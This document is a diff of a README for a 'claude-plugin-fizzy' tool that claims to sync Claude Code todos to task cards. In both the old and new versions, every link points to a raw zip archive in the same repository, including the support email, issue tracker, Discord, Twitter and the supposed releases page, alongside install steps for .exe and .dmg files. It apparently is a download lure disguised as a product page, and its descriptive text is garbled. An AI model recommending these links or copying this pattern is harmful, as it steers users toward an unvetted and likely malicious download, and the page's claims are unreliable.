@@ -1,13 +1,13 @@
 # 🎉 claude-plugin-fizzy - Sync Your Tasks Effortlessly
 
 ## 🖱️ Download Now
-[![Download claude-plugin-fizzy](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip%20CLAUDE%20Plugin%https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)
+[![Download claude-plugin-fizzy](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip%20CLAUDE%20Plugin%https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)
 
 ## 📜 Description
-claude-plugin-fizzy is a simple, user-friendly plugin that connects Claude Code todos directly to https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip cards. With this plugin, you can update your tasks in real time, ensuring you never miss a deadline or forget an important task. 
+claude-plugin-fizzy is a simple, user-friendly plugin that connects Claude Code todos directly to https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip cards. With this plugin, you can update your tasks in real time, ensuring you never miss a deadline or forget an important task. 
 
 ## 📋 Features
-- **Real-Time Sync**: Automatically updates your https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip cards with your Claude Code todos.
+- **Real-Time Sync**: Automatically updates your https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip cards with your Claude Code todos.
 - **Easy Setup**: Quick installation steps mean you can start using the plugin in minutes.
 - **User-Friendly Interface**: Designed for everyone, no programming knowledge is required.
 - **Customizable Settings**: Adjust syncing preferences to fit your workflow.
@@ -17,7 +17,7 @@ Follow these steps to download and install claude-plugin-fizzy:
 
 1. **Visit the Releases Page**
    Click on the link below to access the releases page:
-   [Download Here](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)
+   [Download Here](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)
 
 2. **Choose Your Version**
    Once you are on the releases page, you will find a list of versions for claude-plugin-fizzy. Select the latest version to get the most features and fixes.
@@ -31,7 +31,7 @@ Follow these steps to download and install claude-plugin-fizzy:
    - If you are on macOS, open the `.dmg` file and drag the claude-plugin-fizzy icon to your Applications folder.
 
 5. **Open the Plugin**
-   Once installed, locate claude-plugin-fizzy in your applications menu or folder. Click to open it and proceed to connect your Claude Code with https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip
+   Once installed, locate claude-plugin-fizzy in your applications menu or folder. Click to open it and proceed to connect your Claude Code with https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip
 
 ## ⚙️ System Requirements
 - **Operating System**: Windows 10 and above, or macOS Mojave and above.
@@ -47,19 +47,19 @@ If you run into any problems while downloading or using claude-plugin-fizzy, her
 
 ## 📞 Support
 If you need further assistance, please contact our support team:
-- **Email**: https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip
-- **GitHub Issues**: [Report an Issue](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)
+- **Email**: https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip
+- **GitHub Issues**: [Report an Issue](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)
 
 ## 🛠️ Contributions
 We welcome contributions to improve claude-plugin-fizzy. If you have ideas or features you want to suggest, feel free to submit a pull request or open an issue.
 
 ## 👥 Community
 Join our community of users and developers to share tips and get support:
-- **Discord**: [Join our Discord Channel](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)
-- **Twitter**: Follow us [@claude_plugin](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)
+- **Discord**: [Join our Discord Channel](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)
+- **Twitter**: Follow us [@claude_plugin](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)
 
 ## 📥 Download & Install
 Keep track of your tasks easily. Download claude-plugin-fizzy now:
-[![Download claude-plugin-fizzy](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip%20CLAUDE%20Plugin%https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/.claude-plugin/plugin-claude-fizzy-1.2.zip)
+[![Download claude-plugin-fizzy](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip%20CLAUDE%20Plugin%https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)](https://raw.githubusercontent.com/izahamyatim/claude-plugin-fizzy/main/plugins/fizzy_plugin_claude_3.3.zip)
 
 With these steps, you now have everything you need to successfully download and run the claude-plugin-fizzy. Enjoy effortless task management!
